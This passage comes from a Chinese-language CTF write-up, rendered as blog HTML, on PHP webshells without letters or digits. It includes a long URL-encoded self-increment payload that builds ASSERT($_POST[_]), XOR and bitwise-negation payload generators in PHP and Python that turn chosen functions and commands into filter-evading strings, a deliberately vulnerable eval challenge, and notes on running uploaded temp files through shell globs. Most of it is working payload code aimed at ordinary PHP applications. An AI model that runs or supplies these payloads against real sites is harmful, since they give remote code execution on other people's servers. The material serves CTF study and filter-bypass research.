class="variable">$__</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br><span class="line"></span><br><span class="line">url编码后：</span><br><span class="line">%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">5</span>b%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">40</span>%<span class="number">22</span>%<span class="number">24</span>_%<span class="number">22</span>%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">5</span>b%<span class="number">27</span>!%<span class="number">27</span>%<span class="number">3</span>d%<span class="number">3</span>d%<span class="number">27</span>%<span class="number">40</span>%<span class="number">27</span>%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>___%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>___.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>____%<span class="number">3</span>d%<span class="number">27</span>_%<span class="number">27</span>%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">3</span>b%<span class="number">24</span>____.%<span class="number">3</span>d%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>b%<span class="number">24</span>___(%<span class="number">24</span>_%<span class="number">5</span>b_%<span class="number">5</span>d)%<span class="number">3</span>b</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>第二个payload需要PHP小于7的版本，因为在PHP7，assert不再可以被动态调用</p>
+</blockquote>
+<h2 id="异或："><a href="#异或：" class="headerlink" title="异或："></a>异或：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);  <span class="comment">//新创建一个文件，也就是rce_or.txt，给他写的权限</span></span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>); <span class="comment">//ascii的前16个字符的十六进制应该是01，02，所以在前缀加‘0’</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);  <span class="comment">//前16个后面的就不用加0了</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);   <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);      <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> =<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;     <span class="comment">//如果有符合条件的就筛掉，输出空格</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;             <span class="comment">//可以使用的字符如下</span></span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;    <span class="comment">//十六进制前加百分号就变成了URL编码格式</span></span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));  <span class="comment">//urldecode函数是解URL编码，把他们变成字符串，这里是字符串进行按位或运算，按位或运算后，可以得到新的字符，如%21和%00进行按位或就变成了!,这样我们就可以使用感叹号,就类似于合成新的字符</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;          <span class="comment">//ord函数是将字符变成ASCII码</span></span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;     <span class="comment">//每次到这里都写入刚刚建立的文本内</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()  <span class="comment"># 逐行读取文件 //每一次循环，指针都会指向下一行，输出下一行的字符</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:  <span class="comment"># 读到空，即读完跳出循环</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:  <span class="comment"># 就比如我们这边输入的arg是system，当文本当前行第一个字母是s或者y这些字符就写入s1,s2</span></span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]  <span class="comment"># 提取第一个字符串，具体可以看上面我的截图，如第一行的%00</span></span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]  <span class="comment"># 提取第二个字符串</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span>  <span class="comment"># s1和s2进行或运算就可以合成对应的字母s,y,s,t,e,m</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function:&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
+
+<p>用法</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240818201118170.png" alt="image-20240818201118170"></p>
+<blockquote>
+<p>据说可以用或来： <code>|</code></p>
+</blockquote>
+<h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<h2 id="缓存文件"><a href="#缓存文件" class="headerlink" title="缓存文件"></a>缓存文件</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+<p>参考p神的文章</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821151435925.png" alt="image-20240821151435925"></p>
+<p>从表格中可以看到，PHP 7引入了一种新的解析顺序，这种顺序与PHP 5不同，导致某些表达式在PHP 7下的执行结果与PHP 5不同。</p>
+<p>举例说明：</p>
+<ul>
+<li>表达式 <code>$$foo[&#39;bar&#39;][&#39;baz&#39;]</code>：在PHP 5中，这个表达式被解析为 <code>$foo[&#39;bar&#39;][&#39;baz&#39;]</code> 后再进行双重变量解析。而在PHP 7中，解析顺序改变，<code>($$foo)</code> 首先被计算，然后再应用数组索引。</li>
+</ul>
+<p>意思是：php7前没办法（$a）(); <code>因为php5是先解析（）；里面，为空。</code></p>
+<p>相当于可以：<code>(&#39;phpinfo&#39;)();</code></p>
+<p>看一下题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&gt;<span class="number">35</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;toooooolong!&#x27;</span>);   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>基本上该过滤的都过滤完了</p>
+<h3 id="php7"><a href="#php7" class="headerlink" title="php7"></a>php7</h3><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821154607493.png" alt="image-20240821154607493"></p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821154616406.png" alt="image-20240821154616406"></p>
+<p>取反，然后用之前那个表达式<code>()();</code></p>
+<h3 id="php5"><a href="#php5" class="headerlink" title="php5"></a>php5</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:5.6-apache</span><br></pre></td></tr></table></figure>
+
+<p>首先从想到可以用反引号执行命令</p>
+<p>注意两个知识点：</p>
+<ol>
+<li>shell下可以利用<code>.</code>来执行任意脚本</li>
+<li>Linux文件名支持用glob通配符代替</li>
+</ol>
+<blockquote>
+<p> 注意这里，<code>.</code>是所有UNIX系的shell都可以，但是<code>source</code>属于bash</p>
+</blockquote>
+<p>然后基本&#x2F;tmp下的文件都可执行</p>
+<p>而发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是<code>随机</code>的<code>大小写字母</code>。</p>
+<ol>
+<li><code>*</code>可以代替0个及以上任意字符</li>
+<li><code>?</code>可以代表1个任意字符</li>
+</ol>
+<p>所以：&#x2F;tmp&#x2F;phpXXXXXX &#x3D;&gt; &#x2F;*&#x2F;????????? 或 &#x2F;???&#x2F;?????????</p>
+<p>注意：</p>
+<blockquote>
